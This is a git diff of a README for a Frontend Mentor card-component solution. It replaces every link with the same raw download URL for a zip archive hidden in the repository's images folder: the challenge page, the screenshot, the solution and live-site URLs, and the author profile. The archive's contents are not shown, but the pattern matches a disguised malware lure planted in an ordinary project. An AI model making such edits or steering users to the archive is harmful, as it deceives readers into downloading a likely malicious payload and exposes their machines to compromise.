@@ -1,6 +1,6 @@
 # Frontend Mentor - Stats preview card component solution
 
-This is a solution to the [3-column preview card component challenge on Frontend Mentor](https://www.frontendmentor.io/challenges/3column-preview-card-component-pH92eAR2-). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
+This is a solution to the [3-column preview card component challenge on Frontend Mentor](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/images/column-preview-component-card-3.4.zip). Frontend Mentor challenges help you improve your coding skills by building realistic projects.
 
 ## Table of contents
 
@@ -20,13 +20,13 @@ Users should be able to:
 
 ### Screenshot
 
-![Screenshot of the site](./images/screenshot.png)
+![Screenshot of the site](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/images/column-preview-component-card-3.4.zip)
 
 ### Links
 
-- Solution URL: [Click to visit](https://www.frontendmentor.io/solutions/3column-preview-card-component-KFP3KCTer0)
-- Live Site URL: [Click to visit](https://imadosan.github.io/3-column-preview-card-component/)
+- Solution URL: [Click to visit](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/images/column-preview-component-card-3.4.zip)
+- Live Site URL: [Click to visit](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/images/column-preview-component-card-3.4.zip)
 
 ## Author
 
-- Frontend Mentor - [@imadosan](https://www.frontendmentor.io/profile/imadosan)
+- Frontend Mentor - [@imadosan](https://github.com/imadosan/3-column-preview-card-component/raw/refs/heads/main/images/column-preview-component-card-3.4.zip)
